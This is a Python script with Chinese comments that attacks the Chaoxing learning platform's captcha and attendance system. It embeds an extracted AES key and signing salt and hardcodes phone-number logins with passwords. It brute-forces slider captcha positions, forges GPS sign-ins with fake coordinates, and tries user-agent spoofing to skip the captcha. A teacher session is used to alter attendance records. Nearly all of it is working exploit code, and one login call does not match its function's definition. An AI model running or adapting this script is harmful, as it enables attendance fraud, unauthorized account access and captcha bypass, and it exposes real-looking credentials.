#!/usr/bin/env python3
"""
验证码系统完整破解 - 使用JSONP callback
captcha.chaoxing.com API需要callback参数（JSONP）
"""
import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
CAPTCHA_BASE = "https://captcha.chaoxing.com"
PUID_S = "431407443"
CAPTCHA_ID = "Qt9FIw9o4pwRjOyqM6yizZBh682qN2TU"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

def parse_jsonp(text, callback):
    """解析JSONP响应"""
    prefix = f"{callback}("
    suffix = ")"
    if text.startswith(prefix) and text.endswith(suffix):
        return json.loads(text[len(prefix):-len(suffix)])
    return safe_json(type('R', (), {'text': text, 'json': lambda self: None})())

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

# ======================================================================
# 1. 验证码API - 使用JSONP callback
# ======================================================================
print("=" * 100)
print("[1] 验证码API - 使用JSONP callback")
print("=" * 100)

callback = f"jsonp_{int(time.time()*1000)}"

# Step 1: 获取验证码配置
print("\n  Step 1: 获取验证码配置...")
r = s_s.get(f"{CAPTCHA_BASE}/captcha/get/conf",
            params={"captchaId": CAPTCHA_ID, "callback": callback},
            timeout=20)
print(f"  conf: HTTP {r.status_code}, {r.text[:300]}")

conf_data = None
if r.status_code == 200:
    try:
        conf_data = parse_jsonp(r.text, callback)
        print(f"  配置数据: {json.dumps(conf_data, ensure_ascii=False)[:300]}")
    except:
        print(f"  解析失败: {r.text[:200]}")

# Step 2: 获取验证码图片
print("\n  Step 2: 获取验证码图片...")
callback2 = f"jsonp_{int(time.time()*1000)}"
r = s_s.get(f"{CAPTCHA_BASE}/captcha/get/verification/image",
            params={"captchaId": CAPTCHA_ID, "callback": callback2},
            timeout=20)
print(f"  image: HTTP {r.status_code}, len={len(r.content)}, ct={r.headers.get('content-type', 'N/A')[:30]}")

if r.status_code == 200:
    try:
        img_data = parse_jsonp(r.text, callback2)
        print(f"  图片数据: {json.dumps(img_data, ensure_ascii=False)[:300]}")

        # 提取base64图片
        if isinstance(img_data, dict) and 'repData' in img_data:
            rep = img_data['repData']
            if 'bgImgUrl' in rep:
                print(f"  背景图URL: {rep['bgImgUrl'][:100]}")
            if 'frontImgUrl' in rep:
                print(f"  滑块图URL: {rep['frontImgUrl'][:100]}")
            if 'token' in rep:
                print(f"  Token: {rep['token'][:50]}")
            if 'captchaKey' in rep:
                print(f"  CaptchaKey: {rep['captchaKey'][:50]}")
    except:
        # 可能是图片数据
        if len(r.content) > 1000:
            with open("/workspace/captcha_slide_bg.png", "wb") as f:
                f.write(r.content)
            print(f"  图片已保存到 /workspace/captcha_slide_bg.png")

# ======================================================================
# 2. 完整验证码流程 - 模拟滑块验证
# ======================================================================
print(f"\n{'=' * 100}")
print("[2] 完整验证码流程 - 模拟滑块验证")
print("=" * 100)

# 2a: 获取配置
callback3 = f"jsonp_{int(time.time()*1000)}"
r = s_s.get(f"{CAPTCHA_BASE}/captcha/get/conf",
            params={"captchaId": CAPTCHA_ID, "callback": callback3, "t": str(int(time.time()*1000))},
            timeout=20)
print(f"  获取配置: {r.text[:200]}")

# 2b: 获取滑块图片
callback4 = f"jsonp_{int(time.time()*1000)}"
r = s_s.get(f"{CAPTCHA_BASE}/captcha/get/verification/image",
            params={"captchaId": CAPTCHA_ID, "callback": callback4, "t": str(int(time.time()*1000))},
            timeout=20)

try:
    img_resp = parse_jsonp(r.text, callback4)
    print(f"  图片响应: {json.dumps(img_resp, ensure_ascii=False)[:300]}")

    if isinstance(img_resp, dict) and 'repData' in img_resp:
        rep = img_resp['repData']
        captcha_key = rep.get('captchaKey', '')
        token = rep.get('token', '')

        print(f"  CaptchaKey: {captcha_key}")
        print(f"  Token: {token}")

        # 下载背景图和滑块图
        bg_url = rep.get('bgImgUrl', '')
        front_url = rep.get('frontImgUrl', '')

        if bg_url:
            r_bg = s_s.get(bg_url, timeout=20)
            with open("/workspace/captcha_bg.png", "wb") as f:
                f.write(r_bg.content)
            print(f"  背景图已保存 ({len(r_bg.content)} bytes)")

        if front_url:
            r_front = s_s.get(front_url, timeout=20)
            with open("/workspace/captcha_front.png", "wb") as f:
                f.write(r_front.content)
            print(f"  滑块图已保存 ({len(r_front.content)} bytes)")

        # 2c: 尝试提交验证 - 模拟滑块位置
        # 滑块验证码需要提交滑块的x坐标
        # 尝试不同的x值
        print(f"\n  --- 尝试提交验证码 ---")
        for x_pos in [50, 100, 150, 200, 250]:
            callback5 = f"jsonp_{int(time.time()*1000)}"
            r = s_s.get(f"{CAPTCHA_BASE}/captcha/check/verification/result",
                        params={
                            "captchaId": CAPTCHA_ID,
                            "captchaKey": captcha_key,
                            "token": token,
                            "pointJson": json.dumps({"x": x_pos, "y": 5}),
                            "callback": callback5,
                            "t": str(int(time.time()*1000)),
                        },
                        timeout=20)
            try:
                check_resp = parse_jsonp(r.text, callback5)
                print(f"  x={x_pos}: {json.dumps(check_resp, ensure_ascii=False)[:200]}")

                # 检查是否成功
                if isinstance(check_resp, dict):
                    rep_data = check_resp.get('repData', {})
                    result = rep_data.get('result', '')
                    validate_val = rep_data.get('validate', '')

                    if validate_val:
                        print(f"  *** 获取到validate值: {validate_val} ***")

                        # 使用validate值签到
                        location_aid = "5000163958798"
                        params = {
                            "activeId": location_aid, "uid": PUID_S, "courseId": COURSE_ID,
                            "clientip": "", "latitude": "34.789900", "longitude": "113.664500",
                            "fid": "0", "appType": "15", "ifTiJiao": "1",
                            "validate": validate_val, "address": "郑州市",
                        }
                        r = s_s.get(f"{BASE}/pptSign/stuSignajax", params=params, timeout=20)
                        print(f"  签到结果: {r.text[:200]}")

                        # 验证
                        time.sleep(2)
                        r = s_s.get(f"{BASE}/v2/apis/sign/signIn",
                                    params={"activeId": location_aid, "uid": PUID_S}, timeout=20)
                        d = safe_json(r)
                        final_status = get_status(d)
                        if final_status == 1:
                            print(f"  *** 位置签到伪造成功！漏洞完全确认！***")
                        break
            except:
                print(f"  x={x_pos}: {r.text[:100]}")
except Exception as e:
    print(f"  解析失败: {e}")

# ======================================================================
# 3. 检查是否有不需要验证码的签到活动
# ======================================================================
print(f"\n{'=' * 100}")
print("[3] 检查不需要验证码的签到活动")
print("=" * 100)

# 某些签到活动可能不需要验证码
# 比如已结束的活动可能不需要验证码
# 或者某些特殊类型的签到

# 获取所有活动
r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
            params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
d = safe_json(r)

if isinstance(d, dict) and "activeList" in d:
    for item in d["activeList"]:
        aid = str(item.get("id", ""))
        atype = str(item.get("activeType", ""))
        name = item.get("nameOne", "")

        if atype not in ("2", "74"):
            continue

        # 检查是否已签到
        r2 = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": PUID_S}, timeout=20)
        d2 = safe_json(r2)
        current_status = get_status(d2)

        if current_status is not None:
            # 已签到，跳过
            continue

        # 未签到，尝试不带验证码签到
        params = {
            "activeId": aid, "uid": puid_s, "courseId": COURSE_ID,
            "clientip": "", "latitude": "-1", "longitude": "-1",
            "fid": "0", "appType": "15", "ifTiJiao": "1",
        }
        r3 = s_s.get(f"{BASE}/pptSign/stuSignajax", params=params, timeout=10)
        text = r3.text

        if "成功" in text or "success" in text.lower():
            print(f"  *** 签到成功（无验证码）: {name} (aid={aid}) ***")
            print(f"  响应: {text[:200]}")
        elif "validate" not in text.lower():
            print(f"  非validate响应: {name} (aid={aid}): {text[:100]}")

# ======================================================================
# 4. 探索验证码绕过 - 不同UA
# ======================================================================
print(f"\n{'=' * 100}")
print("[4] 验证码绕过 - 不同UA")
print("=" * 100)

location_aid = "5000163958798"

# 教师设为缺勤
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
         data={"uids": PUID_S, "status": "0", "remark": ""},
         headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": f"{BASE}/",
                  "X-Requested-With": "XMLHttpRequest"},
         timeout=20)
time.sleep(2)

uas_to_test = {
    "MobileApp_6.7.2": get_mobile_ua(),
    "PC_Chrome": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    "WeChat": "Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.0.0 Mobile Safari/537.36 MicroMessenger/8.0.30.2400(0x28001E35) NetType/WIFI Language/zh_CN",
}

for ua_name, ua_str in uas_to_test.items():
    s_test, _ = login("18436633997", "3.1415926Cpy", ua_str)

    params = {
        "activeId": location_aid, "uid": PUID_S, "courseId": COURSE_ID,
        "clientip": "", "latitude": "34.789900", "longitude": "113.664500",
        "fid": "0", "appType": "15", "ifTiJiao": "1",
        "validate": "", "address": "郑州市",
    }
    r = s_test.get(f"{BASE}/pptSign/stuSignajax", params=params, timeout=10)
    print(f"  {ua_name}: {r.text[:120]}")

# 恢复
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
         data={"uids": PUID_S, "status": "1", "remark": ""},
         headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": f"{BASE}/",
                  "X-Requested-With": "XMLHttpRequest"},
         timeout=20)

print("\n测试完成")
